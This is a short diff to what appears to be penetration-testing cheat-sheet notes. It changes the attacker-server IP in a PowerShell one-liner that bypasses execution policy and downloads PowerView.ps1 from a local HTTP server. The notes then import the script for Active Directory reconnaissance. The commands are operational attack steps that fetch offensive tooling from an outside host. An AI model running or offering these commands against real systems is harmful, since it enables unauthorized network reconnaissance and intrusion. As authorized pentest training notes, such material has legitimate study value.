@@ -7,7 +7,7 @@ python -m SimpleHTTPServer
 
 - Windows
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.0.6:8000/PowerView.ps1', 'PowerView.ps1')"
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/PowerView.ps1', 'PowerView.ps1')"
 powershell.exe -nop -exec bypass
 Import-Module .\PowerView.ps1
 ------------------------------------------------------------------------------------------------------------------------------------------------------
